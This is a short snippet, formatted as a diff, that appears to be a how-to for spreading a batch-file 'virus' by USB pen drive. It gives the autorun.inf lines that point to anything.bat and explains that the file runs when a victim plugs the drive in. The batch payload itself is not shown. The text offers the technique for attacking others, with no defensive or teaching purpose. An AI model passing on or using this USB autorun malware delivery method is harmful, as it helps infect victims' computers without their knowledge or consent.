@@ -1,0 +1,12 @@
+Step 1
+open notepad and write
+
+Code-
+
+[autorun]
+open = anything.bat
+icon = anything.ico
+
+Save it as " autorun.inf " and your actual virus " anything.bat " in PD.
+
+When the victim would plug in the PD the autorun.inf will launch anything.bat and commands in batch file virus would execute.
